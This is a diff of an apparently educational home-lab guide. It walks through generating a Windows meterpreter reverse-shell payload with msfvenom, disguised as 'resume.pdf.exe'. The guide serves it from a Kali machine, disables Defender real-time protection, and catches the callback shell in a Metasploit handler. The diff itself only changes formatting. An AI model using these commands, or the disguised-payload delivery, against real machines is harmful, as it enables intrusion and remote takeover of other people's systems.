@@ -110,11 +110,11 @@
 - #### A. Enable RDP on Windows! 
 
 - Open Settings: -> Press Windows + I to open the Settings app. // Go to System > Remote Desktop: -> Toggle on the Enable Remote Desktop option. // Confirm your selection if prompted.
-
+---
 - #### B. Start scanning all portts using nmap :-
 
 - On your kali open terminal -> type command nmap -A 192.168.20.10 -Pn where -Pn skips ping the ip adress is of our victim machine - windows machine and -A enables os detection version detection script scanning and traceroute : will identify any ports that are open
-
+---
 - #### C. Create our own malware :-
 
  - To get a list of payloads - msfvenom -l payloads
@@ -122,19 +122,19 @@
  - Enter msfvenom -p (paste your payload) windows/x64/meterpreter/reverse_tcp lhost=ip of attack machine 192.168.20.11 lport=4444 -f exe -o resume.pdf.exe
    [what this command does :- will generate our malware using meterpreter reverse tcp payload instructed to connect back to the machine based on lhost and lport file format will be an exe and name being resume.exe ]
  
- - verify with ls
-
+ - Verify with ls
+---
  - ####  D. Open a handler that will listen in on the port we have configured in our malware :-
 
- - open metasploit by typing msfconsole -> use exploit/multi/handler now we are in the exploit itself
+ - Open metasploit by typing msfconsole -> use exploit/multi/handler now we are in the exploit itself
 
- - type options change the payload to reverse_tcp set payload (paste your payload) and set lhost as your attacker machine press enter check with options
+ - Type options change the payload to reverse_tcp set payload (paste your payload) and set lhost as your attacker machine press enter check with options
 
- - start the handler by typing in exploit : we are now listening in and waiting for our test machine to exe our malware
-
+ - Start the handler by typing in exploit : we are now listening in and waiting for our test machine to exe our malware
+---
  - #### E. Setup a http server on our kali machine so our test machine can download the malware
 
- - new tab -> same directory ls -> python3 -m http.server 9999 -> enter [ this will allow our test machine to access our kali machine and start downloading the malware from there ]
+ - New tab -> same directory ls -> python3 -m http.server 9999 -> enter [ this will allow our test machine to access our kali machine and start downloading the malware from there ]
 
 ---
  
@@ -142,9 +142,9 @@
 
  - Go to security center -> virus and threat protection -> manage settings -> disable real time protection
 
- - open browser and type in ip of kali : 192.168.20.11:9999 -> click resume.pdf.exe -> download and open it
+ - Open browser and type in ip of kali : 192.168.20.11:9999 -> click resume.pdf.exe -> download and open it
 
- - open cmd with admin priviledges -> netstat -anob [ to see an estb connection with our kali machine ]
+ - Open cmd with admin priviledges -> netstat -anob [ to see an estb connection with our kali machine ]
 
  - Now head over to kali where looking at our handler we should have an open shell we now have a connection [ meterpreter tab ]
 
